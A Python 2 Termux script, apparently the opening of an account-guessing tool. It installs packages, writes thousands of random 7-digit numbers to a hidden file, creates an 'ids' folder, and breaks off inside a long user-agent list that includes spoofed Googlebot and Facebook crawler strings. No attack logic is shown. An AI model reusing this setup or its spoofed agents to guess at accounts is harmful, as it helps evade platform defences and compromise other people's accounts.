#coding=utf-8
#!/usr/bin/python2
#coding=utf-8
try:
    import os, sys, time, datetime, re, threading, json, getpass, urllib, random, requests, subprocess, hashlib, cookielib, uuid, base64, json
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 Juttbrand.py')

os.system('rm -rf .txt')
for n in range(5000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

os.system("git pull")
os.system('clear')
if not os.path.isfile('/data/data/com.termux/files/usr/bin/node'):
    os.system('apt update && apt install nodejs -y')
if not os.path.isfile('/data/data/com.termux/files/usr/bin/ruby'):
    os.system('apt install ruby -y && gem install lolcat')
from requests.exceptions import ConnectionError
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
my_color = [
 O, U, B, K, H, M, P]
warna1 = random.choice(my_color)
my_color = [
 M, H, P, K, U, B, O]
warna2 = random.choice(my_color)
my_color = [
 U, O, K, P, H, K, B]
warna3 = random.choice(my_color)
__author__ = 'Jutt Badshah'
__copyright = 'All rights reserved . Copyright Jutt Badshah'
os.system('termux-setup-storage')
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

agents = [
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED)",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2",
  "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
  "Mozilla/5.0 (Android; Tablet; rv:34.0) Gecko/34.0 Firefox/34.0",
  "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch)",
  "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar)",
  "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
  "Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-N910P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.0; rv:38.0) Gecko/20100101 Firefox/38.0",
  "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0",
  "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0",
  "Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4043.US Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.154 Safari/537.36 LBBROWSER",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; ASJB; ASJB; MAAU; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUSSEM; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDRJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.2; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",
  "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729)",
  "Mozilla/5.0 (X11; CrOS x86_64 6457.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
  "Mozilla/5.0 (X11; CrOS x86_64 7077.95.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.90 Safari/537.36",
  "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0",
  "Mozilla/5.0 (X11; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/33.0.0.0 Safari/534.24",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.76 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-en) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/E7FBAF",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.8 (KHTML, like Gecko)",
  "Mac OS X/10.6.8 (10K549); ExchangeWebServices/1.3 (61); Mail/4.6 (1085)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4; de-de) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/601.7.8 (KHTML, like Gecko) Version/9.1.3 Safari/537.86.7",
  "MacOutlook/0.0.0.150815 (Intel Mac OS X Version 10.10.5 (Build 14F27))",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Gecko/20100101 Firefox/28.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:34.0) Gecko/20100101 Firefox/34.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:46.0) Gecko/20100101 Firefox/46.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:44.0) Gecko/20100101 Firefox/44.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:51.0) Gecko/20100101 Firefox/51.0",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:52.0) Gecko/20100101 Firefox/52.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:38.0) Gecko/20100101 Firefox/38.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
  "Mozilla/5.0 CK={} (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763",
  "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; KTXN)",
  "Mozilla/5.0 (Windows NT 5.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
  "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362",
  "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.83 Safari/537.1",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0",
  "Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0 (via ggpht.com GoogleImageProxy)",
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
  "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
  "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)",
  "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
  "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)",
  "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0",
  "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0",
  "Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/71.0.3578.141 Safari/534.24 XiaoMi/MiuiBrowser/12.4.3-g",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/69.0.3497.81 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36",
  "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060124 Firefox/1.5.0.1",
  "Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0",
  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/53.0.2785.143 Chrome/53.0.2785.143 Safari/537.36",
